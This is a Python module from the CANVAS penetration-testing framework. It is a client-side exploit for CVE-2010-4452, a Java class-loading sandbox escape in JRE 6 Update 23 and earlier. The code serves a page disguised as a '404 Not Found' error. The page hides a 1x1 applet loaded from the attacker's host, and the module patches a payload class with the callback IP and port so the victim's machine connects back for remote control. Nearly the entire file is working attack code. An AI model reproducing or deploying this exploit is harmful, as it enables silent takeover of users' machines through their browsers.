#! /usr/bin/env python

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2002-2011
# http://www.immunityinc.com/CANVAS/ for more information

import sys
if "." not in sys.path:
    sys.path.append(".")

import canvasengine
from exploitutils import *
from httpclientside import httpclientside

NAME                            = "CVE_2010_4452"
DESCRIPTION                     = "Misdesign in Java class loading allows JVM sandbox escape."
DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = "Oracle"
DOCUMENTATION["Repeatability"]  = "Infinite (client side - no crash)"
DOCUMENTATION["CVE Name"]       = "CVE-2010-4452"
DOCUMENTATION["CVE Url"]        = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=2010-4452"
DOCUMENTATION["References"]     = "http://www.oracle.com/technetwork/topics/security/javacpufeb2011-304611.html"
DOCUMENTATION["Date public"]    = "02/25/2011"
DOCUMENTATION["NOTES"]          = """
This exploit will work against Java plugin bundled with
Oracle/SUN JDK/JRE <= 6 Update 23. Target operating systems
are Windows (all versions) and Ubuntu Linux.

For Linux, the official JDK/JRE from Sun/Oracle must be installed,
in the directory /usr/lib/jvm/java-6-sun (which is the default location).
This exploit will not work against OpenJDK/JRE.

This exploit does not work with clientd. Use it with httpserver.
"""

VERSION                         = "1.0"

PROPERTY                        = {}
PROPERTY['TYPE']                = "Exploit"
PROPERTY['SITE']                = "Clientside"
PROPERTY['ARCH']                = [ ["UNIX"], ["Windows"] ]
PROPERTY['VERSION']             = []
PROPERTY['DELIVERY']            = 'HTTP'

TARGETS = { 0 : ['JDK/JRE <= 6 Update 23'] }

class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)
        self.version            = 0
        self.name               = NAME
        self.htmlfile           = "".join( [ random.choice(string.uppercase) for x in range(8) ] ) + ".html"
        # filename is used in the actual http server
        self.filename           = self.htmlfile
        self.classfile          = "mosdef.class"
        # in standalone mode we want it to adhere
        # to manually chosen callback settings ...
        #self.autoFind           = False
        # this exploit can not time out ...
        # it remains active in the browser ...
        self.refresh_rate       = 0
        return

    def neededListenerTypes(self):
        """
        This exploit does not support HTTP MOSDEF!
        """
        return [canvasengine.UNIVERSAL_MOSDEF]

    # Vulnerability detection
    def is_vulnerable( self, info_dict ):
        major, minor, build, patch = self.getJavaVersions(info_dict)
        if not major:
            #No Java
            return 0

        if major == 1:
            if minor <= 6:
                if patch <= 23:
                    # We know this client is vulnerable
                    # assuming we can do TCP outbound on this network
                    return 80
        return 0


    def displayVersions(self):
        for t in TARGETS.keys():
            print "%d: %s" % (t, TARGETS[t][0])
        return

    def make_java_path(self, useragent):
        if "Windows" in useragent:
            # self.path = "file:C:\Program%20Files\Java\jre6\lib\ext"
            # La isla brainstorming FTW, kudos to daniel. This is for IE6
            self.path = "file:///..\..\..\..\..\..\..\Program%20Files\Java\jre6\lib\ext"
        elif "Linux" in useragent:
            self.path = "file:/usr/lib/jvm/java-6-sun/jre/lib/ext/"
        # Unsupported
        else:
            self.path = "file:/home"

    def encode_ip(self, ip):
        t = lambda x: [i for i in x.split('.') ]
        l = lambda x: "%.2x" % int(x)
        j = lambda x: int("".join(x),16)
        return j(map(l,t(ip)))

    ## SPIKE Proxy Callbacks ...

    def makedownloadfile(self):
        tmp = file(os.path.abspath(os.path.join(os.path.dirname(__file__), "Resources/", "mosdef.class")))
        tmp = tmp.replace("AAAAAAAAAAAAAAAAAAAAAA","http://%s:%.4d" % (self.encode_ip(self.callback.ip),self.bindport))
        tmp = tmp.replace("IIIIIIIIIIIIIIII",self.callback.ip+" "*(16 - len(self.callback.ip)))
        tmp = tmp.replace("PPPPPPPP", str(self.callback.port)+" "*(8 - len(str(self.callback.port))))
        try:
            typ = self.engine.getMosdefType(canvasengine.JAVASERVER)
        except:
            typ = 15
        tmp = tmp.replace("TTTTTTTT", str(typ)+" "*(8 - len(str(typ))))
        return tmp

    def makefile(self):
        html = """
        <html>
            <head>
                <title>404 Not Found</title>
            </head>
            <body>
                <!-- Site 404 Handler Applet -->
                <div id="exploit"></div>
                <script>
                  if(navigator.appName=="Netscape"){
                    var lang = navigator.language;
                  } else {
                    var lang = navigator.userLanguage;
                  }
                  var codebase = "%s";
                  // Complete other languages here
                  if       (lang.indexOf('es') > -1) {
                    codebase = codebase.replace("Program%%20Files", "Archivos%%20de%%20Programa");
                  } else if(lang.indexOf('de') > -1) {
                    codebase = codebase.replace("Program%%20Files", "Programme");
                  } else if(lang.indexOf('it') > -1) {
                    codebase = codebase.replace("Program%%20Files", "Programmi");
                  }
                  document.getElementById("exploit").innerHTML = '<applet codebase="'+codebase+'" code="http://%s:%.4d/mosdef" width="1" height="1" />';
                </script>
                <h1>Not Found</h1>
                <p>The requested URL /%s was not found on this server.</p>
                <hr>
            </body>
        </html>
        """ % (self.path.replace("\\","\\\\"),
               self.encode_ip(self.callback.ip),
               self.bindport,
               self.htmlfile)
        return html

    def makesploit(self, clientheader, clientbody):
        # we are platform independent
        from libs.spkproxy import header, body
        h             = header('SERVER')
        b             = body()
        user_agent    = clientheader.getStrValue(['User-Agent'])
        self.bindport = self.clientsideargs["bindport"]

        self.log("[+] User agent of connecting host: %s" % user_agent)
        if clientheader.URL.count(self.htmlfile):
            self.make_java_path(user_agent)
            self.log("[+] Sending HTML")
            b.setBody(self.makefile())

        elif clientheader.URL.count(self.classfile):
            self.log("[+] Sending Class")
            data = self.makedownloadfile()
            self.log("[+] Sending %d bytes" % len(data))
            h.addHeader('Content-type', 'binary/octet-stream')
            h.addHeader('Connection', 'close')
            b.setBody(data)

        elif clientheader.URL.count("done"):
            self.log("Did not load Java applet!")
            return None, None
        else:
            self.log("[+] Redirect to %s" % self.htmlfile)
            h.status = '302'
            h.addHeader('Location', self.htmlfile)
            h.addHeader('Content-Type', 'text/html')

        return h,b

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)

